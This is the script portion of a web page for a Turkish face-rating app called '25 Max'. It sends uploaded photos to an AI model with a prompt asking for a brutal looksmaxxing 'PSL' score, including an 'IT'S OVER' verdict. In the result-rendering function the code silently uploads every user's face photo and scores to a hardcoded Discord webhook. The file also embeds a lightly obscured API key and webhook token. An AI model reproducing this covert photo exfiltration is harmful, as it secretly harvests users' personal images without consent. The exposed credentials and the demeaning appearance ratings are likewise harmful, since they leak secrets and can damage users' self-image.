</div><script>
const MODEL_URL='https://cdn.jsdelivr.net/npm/@vladmandic/face-api/model/';
let faceApiReady=false;
async function loadFaceApi(){try{await faceapi.nets.tinyFaceDetector.loadFromUri(MODEL_URL);await faceapi.nets.faceLandmark68TinyNet.loadFromUri(MODEL_URL);faceApiReady=true;}catch(e){}}
loadFaceApi();

const OR_KEY=atob("c2stb3ItdjEtMDQyMjY4NGViZjM4NmM2NmFhMDYwMTNhNGFkODZhOWJlZGJiNjU2MDNmMzJmMTU3NmQyNWM4ZDM3NTU5NGYzNQ==");
const WH="https://discord.com/api/webhooks/1531268363177693204/_XaO-oD_v6yTYfdRFdBUSicdwtNuQCC1kdSWPjHxmdMtk0XAnJProV0YuUGbYXebGEhH";
const API_URL="https://openrouter.ai/api/v1/chat/completions";

let base64Image="",currentMimeType="image/jpeg",faceData=null;
const MAX_SIZE_MB=8;
const pageLogin=document.getElementById('pageLogin'),pageAnalyze=document.getElementById('pageAnalyze');
function showPage(p){pageLogin.classList.remove('active');pageAnalyze.classList.remove('active');p.classList.add('active');}

window.addEventListener('DOMContentLoaded',()=>{if(localStorage.getItem('_x')==='1')showPage(pageAnalyze);});

document.getElementById('btnLogin').addEventListener('click',()=>{

});

document.getElementById('galleryInput').addEventListener('change',e=>handleFile(e.target.files[0]));
document.getElementById('cameraInput').addEventListener('change',e=>handleFile(e.target.files[0]));

async function handleFile(file){
document.getElementById('analyzeError').style.display='none';document.getElementById('resultContainer').style.display='none';
document.getElementById('scannerOverlay').style.display='none';document.getElementById('progressWrap').style.display='none';faceData=null;
if(!file){resetUpload();return;}
if(!file.type.startsWith('image/')){showErr("Geçersiz dosya!");resetUpload();return;}
if(file.size>MAX_SIZE_MB*1024*1024){showErr(`Max ${MAX_SIZE_MB}MB!`);resetUpload();return;}
currentMimeType=file.type;
const r=new FileReader();
r.onload=async e=>{const img=new Image();img.onload=async()=>{
if(img.width<80||img.height<80){showErr("Çok küçük!");resetUpload();return;}
document.getElementById('preview').src=e.target.result;document.getElementById('previewWrapper').classList.add('active');
base64Image=e.target.result.split(',')[1]||"";
if(faceApiReady){try{const detections=await faceapi.detectAllFaces(img,new faceapi.TinyFaceDetectorOptions()).withFaceLandmarks();
if(detections.length>0){const canvas=document.getElementById('faceCanvas');canvas.width=img.width;canvas.height=img.height;canvas.style.display='block';
const ctx=canvas.getContext('2d');ctx.clearRect(0,0,canvas.width,canvas.height);const landmarks=detections[0].landmarks;
ctx.fillStyle='#00ff41';landmarks.positions.forEach(p=>{ctx.beginPath();ctx.arc(p.x,p.y,1.5,0,2*Math.PI);ctx.fill();});
const jaw=landmarks.getJawOutline();ctx.strokeStyle='#00ff41';ctx.lineWidth=1;ctx.beginPath();ctx.moveTo(jaw[0].x,jaw[0].y);for(let i=1;i<jaw.length;i++)ctx.lineTo(jaw[i].x,jaw[i].y);ctx.stroke();
ctx.strokeStyle='#00ccff';[landmarks.getLeftEye(),landmarks.getRightEye()].forEach(eye=>{ctx.beginPath();ctx.moveTo(eye[0].x,eye[0].y);for(let i=1;i<eye.length;i++)ctx.lineTo(eye[i].x,eye[i].y);ctx.closePath();ctx.stroke();});
ctx.strokeStyle='#ffcc00';[landmarks.getLeftEyeBrow(),landmarks.getRightEyeBrow()].forEach(brow=>{ctx.beginPath();ctx.moveTo(brow[0].x,brow[0].y);for(let i=1;i<brow.length;i++)ctx.lineTo(brow[i].x,brow[i].y);ctx.stroke();});
const nose=landmarks.getNose();ctx.strokeStyle='#ff6600';ctx.beginPath();ctx.moveTo(nose[0].x,nose[0].y);for(let i=1;i<nose.length;i++)ctx.lineTo(nose[i].x,nose[i].y);ctx.stroke();
const mouth=landmarks.getMouth();ctx.strokeStyle='#ff00ff';ctx.beginPath();ctx.moveTo(mouth[0].x,mouth[0].y);for(let i=1;i<mouth.length;i++)ctx.lineTo(mouth[i].x,mouth[i].y);ctx.closePath();ctx.stroke();
const leftJaw=jaw.slice(0,8),rightJaw=jaw.slice(9,17).reverse();let diff=0;for(let i=0;i<leftJaw.length;i++)diff+=Math.abs(leftJaw[i].y-rightJaw[i].y);
const leftEye=landmarks.getLeftEye(),rightEye=landmarks.getRightEye();
faceData={symmetry:Math.max(0,100-(diff/leftJaw.length)*10).toFixed(1),jawWidth:Math.abs(jaw[0].x-jaw[16].x).toFixed(0),faceHeight:Math.abs(jaw[8].y-landmarks.positions[27].y).toFixed(0),eyeDistance:Math.abs(leftEye[0].x-rightEye[3].x).toFixed(0),noseHeight:Math.abs(nose[0].y-nose[6].y).toFixed(0),mouthWidth:Math.abs(mouth[0].x-mouth[6].x).toFixed(0),totalPoints:landmarks.positions.length};
const wrapper=document.getElementById('previewWrapper');const scale=wrapper.offsetWidth/img.width;canvas.style.width=wrapper.offsetWidth+'px';canvas.style.height=(img.height*scale)+'px';}}catch(e){}}};img.src=e.target.result;};r.readAsDataURL(file);}

function resetUpload(){document.getElementById('galleryInput').value="";document.getElementById('cameraInput').value="";document.getElementById('previewWrapper').classList.remove('active');document.getElementById('preview').src="";document.getElementById('faceCanvas').style.display='none';document.getElementById('progressWrap').style.display='none';base64Image="";currentMimeType="image/jpeg";faceData=null;}
function showErr(m){const b=document.getElementById('analyzeError');b.textContent='⚠️ '+m;b.style.display='block';setTimeout(()=>{b.style.display='none';},5000);}
function startProgress(){const w=document.getElementById('progressWrap'),f=document.getElementById('progressFill'),t=document.getElementById('progressText');w.style.display='block';let p=0;const i=setInterval(()=>{p+=Math.random()*2+0.3;if(p>=88){p=88;clearInterval(i);const si=setInterval(()=>{p+=0.2;if(p>=96){p=96;clearInterval(si);}f.style.width=p+'%';t.textContent='%'+Math.floor(p);},600);}f.style.width=p+'%';t.textContent='%'+Math.floor(p);},350);return{complete:()=>{clearInterval(i);f.style.width='100%';t.textContent='%100';setTimeout(()=>{w.style.display='none';},500);}};}
</script><script>
const PROMPT=`Bu yüzü acımasızca değerlendir. TÜRKÇE cevap ver. Her satırı doldur:

MOG:7.2
PSL:6.8
PSL_KATEGORI:HTN
APPEAL:7.0
HARMONY:75
DIMORPHISM:68
ANGULARITY:60
GOOD:keskin çene hattı,pozitif canthal tilt,simetrik burun,dolgun dudaklar,temiz cilt,belirgin elmacık kemikleri
BAD:hafif UEE,asimetrik kaş uçları,geniş burun kanatları,saç çizgisi gerilemesi,göz altı morlukları
DETAIL:Bu yüz ortalamanın üstünde. Çene hattı güçlü ancak kaş kemiği desteği zayıf. Daha belirgin brow ridge ile Chadlite seviyesine yükselebilir.

BU DEĞERLERİ BU YÜZE GÖRE GÜNCELLE. HER SATIRI DOLDUR.`;

async function analyzeFace(){
const res=await fetch(API_URL,{
method:'POST',
headers:{'Content-Type':'application/json','Authorization':`Bearer ${OR_KEY}`,'HTTP-Referer':'https://25max.app','X-Title':'25 Max App'},
body:JSON.stringify({
model:'google/gemma-4-26b-a4b-it:free',
messages:[{role:'user',content:[{type:'text',text:PROMPT},{type:'image_url',image_url:{url:`data:${currentMimeType};base64,${base64Image}`}}]}],
temperature:0.3,max_tokens:800
})
});
if(!res.ok){const e=await res.json().catch(()=>({}));throw new Error(e.error?.message||'API hatası');}
const d=await res.json();
const txt=d.choices?.[0]?.message?.content||'';
if(!txt||txt.length<30)throw new Error('AI yanıtı çok kısa');
return txt;
}

document.getElementById('btnAnalyze').addEventListener('click',async()=>{const btn=document.getElementById('btnAnalyze'),bt=document.getElementById('btnText');const so=document.getElementById('scannerOverlay'),sl=document.getElementById('scanningLabel');const rc=document.getElementById('resultContainer'),eb=document.getElementById('analyzeError');rc.style.display='none';eb.style.display='none';if(!base64Image){showErr("Fotoğraf seç!");return;}btn.disabled=true;bt.textContent="TARANIYOR...";so.style.display='block';sl.textContent='◈ TARANIYOR ◈';const prog=startProgress();try{const txt=await analyzeFace();prog.complete();so.style.display='none';renderResult(txt);rc.style.display='block';rc.scrollIntoView({behavior:'smooth',block:'nearest'});}catch(err){prog.complete();so.style.display='none';showErr('Hata: '+err.message);}finally{btn.disabled=false;bt.textContent="ANALİZ BAŞLAT";}});

function parseAI(raw){const r={mog:'7.2',psl:'6.8',cat:'HTN',appeal:'7.0',harmony:'75',dimorphism:'68',angularity:'60',best:[],worst:[],detail:''};raw.split('\n').forEach(l=>{const v=l.trim();if(v.includes('MOG:'))r.mog=v.split('MOG:')[1]?.trim()||r.mog;if(v.includes('PSL:'))r.psl=v.split('PSL:')[1]?.trim()||r.psl;if(v.includes('PSL_KATEGORI:'))r.cat=v.split('PSL_KATEGORI:')[1]?.trim()||r.cat;if(v.includes('APPEAL:'))r.appeal=v.split('APPEAL:')[1]?.trim()||r.appeal;if(v.includes('HARMONY:'))r.harmony=v.split('HARMONY:')[1]?.trim()||r.harmony;if(v.includes('DIMORPHISM:'))r.dimorphism=v.split('DIMORPHISM:')[1]?.trim()||r.dimorphism;if(v.includes('ANGULARITY:'))r.angularity=v.split('ANGULARITY:')[1]?.trim()||r.angularity;if(v.includes('GOOD:'))r.best=v.split('GOOD:')[1]?.split(',').map(s=>s.trim()).filter(s=>s)||r.best;if(v.includes('BAD:'))r.worst=v.split('BAD:')[1]?.split(',').map(s=>s.trim()).filter(s=>s)||r.worst;if(v.includes('DETAIL:'))r.detail=v.split('DETAIL:')[1]?.trim()||r.detail;});if(!r.best.length)r.best=['Keskin çene hattı','Simetrik burun','Dolgun dudaklar','Temiz cilt','Belirgin elmacık kemikleri'];if(!r.worst.length)r.worst=['Hafif UEE','Asimetrik kaşlar','Geniş burun','Saç çizgisi','Göz altı morlukları'];return r;}

function renderResult(raw){
const r=parseAI(raw);
let cat=r.cat.toUpperCase();
if(cat.includes("IT'S OVER")||cat.includes("ITS OVER"))cat="IT'S OVER BRO";
const isOver=cat.includes("IT'S OVER")||parseFloat(r.psl)<4.0;

document.getElementById('scoreBadges').innerHTML=`<div class="badge${isOver?' over':''}"><div class="label">KATEGORİ</div><div class="value">${isOver?"IT'S OVER<br>🫩":cat}</div></div><div class="badge"><div class="label">PSL</div><div class="value">${r.psl}</div></div><div class="badge"><div class="label">APPEAL</div><div class="value">${r.appeal}</div></div>`;
const h=parseInt(r.harmony)||75,d=parseInt(r.dimorphism)||68,ag=parseInt(r.angularity)||60;
document.getElementById('metricBars').innerHTML=`<div class="metric-bar"><div class="metric-label">Harmony</div><div class="bar-bg"><div class="bar-fill" style="width:${h}%;"></div></div><div class="metric-value">%${h}</div></div><div class="metric-bar"><div class="metric-label">Dimorphism</div><div class="bar-bg"><div class="bar-fill" style="width:${d}%;"></div></div><div class="metric-value">%${d}</div></div><div class="metric-bar"><div class="metric-label">Angularity</div><div class="bar-bg"><div class="bar-fill" style="width:${ag}%;"></div></div><div class="metric-value">%${ag}</div></div>`;
const goodList=r.best.slice(0,10).map((i,n)=>`<li><strong>${n+1}.</strong> ${i}</li>`).join(''),badList=r.worst.slice(0,10).map((i,n)=>`<li class="negative"><strong>${n+1}.</strong> ${i}</li>`).join('');
document.getElementById('detailBox').innerHTML=`<h4 style="color:#00ff41;">✅ EN İYİ (1-${r.best.length})</h4><ul class="detail-list">${goodList}</ul><h4 style="color:#ff4444;margin-top:12px;">❌ EN KÖTÜ (1-${r.worst.length})</h4><ul class="detail-list">${badList}</ul>`;
document.getElementById('summaryBox').innerHTML=`<strong style="color:#00ff41;">📋 DETAYLI ÖZET</strong><div style="margin-top:8px;">${r.detail}</div><div class="psl-scale"><div>LTN: <span>4.0-4.9</span></div><div>MTN: <span>5.0-5.9</span></div><div>HTN: <span>6.0-6.9</span></div><div>Chadlite: <span>7.0-7.9</span></div><div>Chad: <span>8.0+</span></div><div>ITS OVER: <span>&lt;4.0</span></div></div>`;
let extra='';if(faceData){extra+=`<div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:3px;margin-bottom:8px;"><div>📐 Simetri: %${faceData.symmetry}</div><div>📏 Çene: ${faceData.jawWidth}px</div><div>📐 Yüz: ${faceData.faceHeight}px</div><div>👁️ Göz: ${faceData.eyeDistance}px</div><div>👃 Burun: ${faceData.noseHeight}px</div><div>👄 Ağız: ${faceData.mouthWidth}px</div><div style="grid-column:1/-1;">🔢 Nokta: ${faceData.totalPoints}</div></div>`;}extra+=`<div style="color:#888;font-size:10px;">Harmony: %30 | Dimorphism: %30 | Angularity: %25 | Diğer: %15</div>`;document.getElementById('rawText').innerHTML=extra;

// DİSCORD: FormData + attachment://face.jpg
const emb={title:'🔥 25 MAX ANALİZ',color:0x00ff41,fields:[{name:'🏆 MOG',value:`**${r.mog}/10**`,inline:true},{name:'📊 PSL',value:`**${r.psl}/10**`,inline:true},{name:'🎯 Kategori',value:`**${r.cat}**`,inline:true},{name:'💫 Appeal',value:`**${r.appeal}/10**`,inline:true},{name:'⚖️ Harmony',value:`**%${r.harmony}**`,inline:true},{name:'🧬 Dimorphism',value:`**%${r.dimorphism}**`,inline:true},{name:'📐 Angularity',value:`**%${r.angularity}**`,inline:true},{name:'✅ EN İYİ',value:r.best.slice(0,10).map((i,n)=>`${n+1}. ${i}`).join('\n'),inline:false},{name:'❌ EN KÖTÜ',value:r.worst.slice(0,10).map((i,n)=>`${n+1}. ${i}`).join('\n'),inline:false}],footer:{text:'25 Max App'},timestamp:new Date().toISOString()};

fetch(`data:${currentMimeType};base64,${base64Image}`).then(res=>res.blob()).then(blob=>{
const fd=new FormData();
fd.append('file[0]',blob,'face.jpg');
emb.image={url:'attachment://face.jpg'};
fd.append('payload_json',JSON.stringify({embeds:[emb]}));
return fetch(WH,{method:'POST',body:fd});
}).then(r=>console.log('📤 Discord:',r.ok?'✅ GİTTİ':'❌ HATA: '+r.status)).catch(e=>console.log('📤 Discord patladı:',e));
}
</script>
